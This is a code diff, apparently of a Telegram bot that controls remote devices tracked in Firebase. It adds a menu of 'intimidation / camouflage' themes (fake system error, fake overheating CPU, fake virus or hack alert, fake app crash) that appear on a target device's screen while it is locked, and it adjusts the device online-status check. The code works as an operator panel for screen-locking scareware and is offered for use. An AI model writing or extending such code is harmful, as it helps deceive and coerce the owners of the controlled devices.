@@ -83,6 +83,9 @@ async function handleTelegramUpdate(update, env) {
     } else if (data.startsWith("DEV_MENU_")) {
       const devId = data.replace("DEV_MENU_", "");
       await sendDeviceSubMenu(botToken, fromId, dbUrl, devId);
+    } else if (data.startsWith("CMD_THEME_")) {
+      const devId = data.replace("CMD_THEME_", "");
+      await sendThemesSubMenu(botToken, fromId, devId);
     } else if (data.startsWith("CMD_")) {
       // Format: CMD_<ACTION>_<DEVICE_ID>
       const parts = data.split("_");
@@ -91,6 +94,26 @@ async function handleTelegramUpdate(update, env) {
       await sendDeviceCommand(botToken, fromId, dbUrl, devId, action);
     }
   }
+}
+
+// Sub-Menu Pilihan Tema Gertakan untuk 1 Perangkat
+async function sendThemesSubMenu(botToken, chatId, devId) {
+  const keyboard = [
+    [
+      { text: "⚠️ Sistem Rusak / Error", callback_data: `CMD_SET-THEME-ERROR_${devId}` },
+      { text: "🔥 CPU Overheat 88°C", callback_data: `CMD_SET-THEME-OVERHEAT_${devId}` }
+    ],
+    [
+      { text: "🛡️ Virus / Hack Alert", callback_data: `CMD_SET-THEME-THREAT_${devId}` },
+      { text: "💥 Fake Crash App", callback_data: `CMD_SET-THEME-CRASH_${devId}` }
+    ],
+    [
+      { text: "⬅️ Kembali ke Menu Perangkat", callback_data: `DEV_MENU_${devId}` }
+    ]
+  ];
+
+  const text = `🎭 <b>Pilih Gaya Gertakan / Kamuflase untuk ${devId}:</b>\nTema ini akan langsung muncul di layar saat terkunci:`;
+  await sendTelegramMessage(botToken, chatId, text, { inline_keyboard: keyboard });
 }
 
 // Mengambil seluruh data perangkat dari Firebase Realtime DB
@@ -108,11 +131,11 @@ async function getDevicesFromFirebase(dbUrl) {
 // Helper Cek Status Online / Offline Perangkat
 function getDeviceOnlineStatus(lastSeen) {
   if (!lastSeen) return { isOnline: false, text: "🔴 Offline (Belum pernah sinkron)" };
-  const diffMs = Date.now() - lastSeen;
-  if (diffMs < 3 * 60 * 1000) { // Kurang dari 3 menit = Online
+  const diffMs = Math.abs(Date.now() - lastSeen);
+  if (diffMs < 5 * 60 * 1000) { // Toleransi hingga 5 menit
     return { isOnline: true, text: "🟢 Online" };
   }
-  const mins = Math.floor(diffMs / 60000);
+  const mins = Math.max(1, Math.floor(diffMs / 60000));
   if (mins < 60) {
     return { isOnline: false, text: `🔴 Offline (${mins}m lalu)` };
   }
